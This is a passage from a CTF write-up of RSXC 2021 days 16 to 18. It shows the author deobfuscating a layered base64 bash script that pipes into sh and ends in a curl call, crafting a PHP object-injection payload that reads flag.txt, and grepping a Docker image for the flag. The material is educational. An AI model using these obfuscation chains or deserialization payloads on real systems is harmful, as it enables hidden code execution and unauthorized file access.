x=$(echo "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
echo $x | base64
#x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
#eval "$N0q$x$Hc2$rQW"
```

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ bash 16-challenge.sh | base64 -d
echo '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 ' | rev |base64 -d
```

Running this command output, we see something that resembles the source code of the bash script we just ran. But the variable `s` seemed to have changed.

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ echo '=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' | rev | base64 -d
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

Further I piped this bash output into a new file `16-challenge2.sh`, adding the neccessary edits and modifications to safely run the code:

```bash
# 16-challenge2.sh
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(echo "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
echo $x | base64
#eval "$N0q$x$Hc2$rQW"
```

Running this script gave somewhat similar output as before, however when executing the output command we get something quite new:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ bash 16-challenge2.sh | base64 -d
echo 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY ' | rev |base64 -d
juki@izone:~/Desktop/ctf/rsxc2021$ echo 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY' | rev |base64 -d
agrwa=MD;afwanmdwaa=Yy;echo "ZWNobyAweDIwNjM3NTcyNmMy"$agrwa"Y4NzQ3NDcwM2EyZjJmNzI3Mzc4NjMyZTZlNm"$afwanmdwaa"Zj"$afwanmdwaa"MzYz"$agrwa""$afwanmdwaa"MzMzNDY0MzI2MTY2NjM2NDM0NjIzMzM5MzUz"$agrwa"Y1MzQ2MzM2MzMzNDMxNjU2Nj"$afwanmdwaa"NjMzMTMwNjM2ND"$afwanmdwaa"Mzcz"$agrwa"Y1MzczODMyNjMzNzMwNjIzMj"$afwanmdwaa"NjYzODM5MzUz"$agrwa"Y1MzMz"$agrwa"M1NjE2NDM5MzA2NT"$afwanmdwaa"NjQzNTY2MmY2NjZjNjE2NzJlNzQ3ODc0M2IyMzU1NmM0ZTU5NTEzMzc0NDU2MjMyMzQ2ZTY0NDYzOTY5NjI0NzZjNzU1YTQ3NzgzNTU4MzM1Mjc5NjQ1ODRlMzA1ODMyMzk2OTVhNmU1NjdhNTkzMjQ2MzA1YTU3NTI2NjU5MzIzOTZiNWE1NjM5NzA2NDQ2Mzk3NDYxNTc2NDZmNjQ0NjM5NmI2MjMxMzk3YT"$afwanmdwaa"MzIzMTZjNjQ0NzY4NzA2MjZkNjQ2NjU5NmQ0NjZiNjY1MTNkM2QzYjIzNTU2YzRlNTk1MTMzNzQ0NT"$afwanmdwaa"MzIzNDZlNjQ0NjM5Njk2MjQ3NmM3NTVhNDc3ODM1NTgzMzUyNzk2NDU4NGUz"$agrwa"U4MzIzOTY5NWE2ZTU2N2E1OTMyNDYz"$agrwa"VhNTc1MjY2NTkzMjM5NmI1YTU2Mzk3"$agrwa"Y0NDYzOTc0NjE1NzY0NmY2NDQ2Mzk2Yj"$afwanmdwaa"MzEzOTdhNjIzMjMxNmM2NDQ3Njg3"$agrwa""$afwanmdwaa"NmQ2NDY2NTk2ZDQ2NmI2NjUxM2QzZDBhIHwgeHhkIC1yIC1wIHwgc2gK" | base64 -d | sh
```

Looking like we're nearing the final steps as there is some commands piped into `sh`, I write the output into the final bash file `16-challenge3.sh` with some minor changes once again:

```bash
# 16-challenge3.sh
agrwa=MD;afwanmdwaa=Yy;echo "ZWNobyAweDIwNjM3NTcyNmMy"$agrwa"Y4NzQ3NDcwM2EyZjJmNzI3Mzc4NjMyZTZlNm"$afwanmdwaa"Zj"$afwanmdwaa"MzYz"$agrwa""$afwanmdwaa"MzMzNDY0MzI2MTY2NjM2NDM0NjIzMzM5MzUz"$agrwa"Y1MzQ2MzM2MzMzNDMxNjU2Nj"$afwanmdwaa"NjMzMTMwNjM2ND"$afwanmdwaa"Mzcz"$agrwa"Y1MzczODMyNjMzNzMwNjIzMj"$afwanmdwaa"NjYzODM5MzUz"$agrwa"Y1MzMz"$agrwa"M1NjE2NDM5MzA2NT"$afwanmdwaa"NjQzNTY2MmY2NjZjNjE2NzJlNzQ3ODc0M2IyMzU1NmM0ZTU5NTEzMzc0NDU2MjMyMzQ2ZTY0NDYzOTY5NjI0NzZjNzU1YTQ3NzgzNTU4MzM1Mjc5NjQ1ODRlMzA1ODMyMzk2OTVhNmU1NjdhNTkzMjQ2MzA1YTU3NTI2NjU5MzIzOTZiNWE1NjM5NzA2NDQ2Mzk3NDYxNTc2NDZmNjQ0NjM5NmI2MjMxMzk3YT"$afwanmdwaa"MzIzMTZjNjQ0NzY4NzA2MjZkNjQ2NjU5NmQ0NjZiNjY1MTNkM2QzYjIzNTU2YzRlNTk1MTMzNzQ0NT"$afwanmdwaa"MzIzNDZlNjQ0NjM5Njk2MjQ3NmM3NTVhNDc3ODM1NTgzMzUyNzk2NDU4NGUz"$agrwa"U4MzIzOTY5NWE2ZTU2N2E1OTMyNDYz"$agrwa"VhNTc1MjY2NTkzMjM5NmI1YTU2Mzk3"$agrwa"Y0NDYzOTc0NjE1NzY0NmY2NDQ2Mzk2Yj"$afwanmdwaa"MzEzOTdhNjIzMjMxNmM2NDQ3Njg3"$agrwa""$afwanmdwaa"NmQ2NDY2NTk2ZDQ2NmI2NjUxM2QzZDBhIHwgeHhkIC1yIC1wIHwgc2gK" | base64 -d
```

Running this bash script gave a completely different output with a quite large hexadecimal piped into `xxd` and then `sh` for execution. Further running this command directly without executing (`| sh`) gives:

```bash
juki@izone:~/Desktop/ctf/rsxc2021$ bash 16-challenge3.sh
echo 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a | xxd -r -p | sh
juki@izone:~/Desktop/ctf/rsxc2021$ echo 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a | xxd -r -p
 curl http://rsxc.no/b60b34d2afcd4b3950e4c6341efbc10cdb70e782c70b2bf8950e305ad90ebd5f/flag.txt;#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==;#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==
```

The output seemed to be a navigation to the an url containing the flag, but opening the page gives us a 404 Not Found response. However, looking at the comments after the curl command we see some strings looking similar to an base64 encoded string. Decoding the comment gives us the flag:

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ echo UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ== | base64 -d
RSXC{Don't_blindly_trust_obfuscated_code_it_might_do_something_bad}
```

The flag is: `RSXC{Don't_blindly_trust_obfuscated_code_it_might_do_something_bad}`

## [DAY 17] My XMas card

### Challenge

> We felt like it's time to start sending out some XMas cards, maybe you find something you like?
> http://rsxc.no:20017

### Solution

Navigating to the page we are greeted with a Xmas card along with the lines of "Finding your card in /files". This hint tells us that there exists a directory/path to `/files`. Going to that said directory, we can see that there are 3 files: `card.txt`, `index.php-1` and `flag.txt`. Guessing that the flag is in the `flag.txt` file, I get a forbidden error on opening it as I don't have permission to access the resource. Looking at all the other files we see that the content of `card.txt` is loaded and read at `index.php`, and the source code could be seen in `index.php-1`:

```php
// index.php
file = __DIR__. "/files/".$this->file; if(substr(realpath($this->file),0,strlen(__DIR__)) == __DIR__){ echo("Finding your card in /files") echo(file_get_contents($this->file,true)); } else { echo "NO ðŸ˜ "; } } } if(isset($_GET['card']) && !empty($_GET['card'])){ $card = unserialize(base64_decode($_GET['card'])); } else { $card = new Card; $card->file = 'files/card.txt'; } $card->displayCard();
```

Looking at the source code we can see that this challenge is about PHP Deserialization/Object Injection. By sending in an arbitrary base64 serialized `Card` object to the GET request input, the object is constructed and the method `displayCard()` is run. Knowing the vulnerability, solving the challenge has become as easy as creating my own class of `Card` and then serializing it:

```php
<?php
class Card {
	private $file;
	function __construct() {
		$this->file = 'flag.txt';
	}
}
echo base64_encode(serialize(new Card));
// Tzo0OiJDYXJkIjoxOntzOjEwOiIAQ2FyZABmaWxlIjtzOjg6ImZsYWcudHh0Ijt9
?>
```

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ curl http://rsxc.no:20017/?card=Tzo0OiJDYXJkIjoxOntzOjEwOiIAQ2FyZABmaWxlIjtzOjg6ImZsYWcudHh0Ijt9
Finding your card in /files
RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}
```

The flag is: `RSXC{Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted}`

## [DAY 18] Remember the flag? Docker remembers

### Challenge

> We found a docker image, but it seems that the flag has been removed from it, could you help us get it back?
> https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip

### Solution

We are given a zip file containing a docker image. Usually what one would start with a challenge similar like this is to analyze the different commands and files found in dockerfile and container. However, after unzipping it and just simply running `strings` and greping for the flag on the uncompressed file gives us the flag in plaintext... Sometimes, solving a challenge can be as easy as just that.

```shell
juki@izone:~/Desktop/ctf/rsxc2021$ unzip 18-challenge.zip
Archive:  18-challenge.zip
  inflating: Dockerfile
  inflating: docker-box.tar.gz
juki@izone:~/Desktop/ctf/rsxc2021$ tar -xzf docker-box.tar.gz
juki@izone:~/Desktop/ctf/rsxc2021$ strings docker-box.tar | grep "RSXC"
RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}
```

The flag is: `RSXC{Now_you_know_that_docker_images_are_like_onions.They_have_many_layers}`

## [DAY 19] The inclusive xmas cards

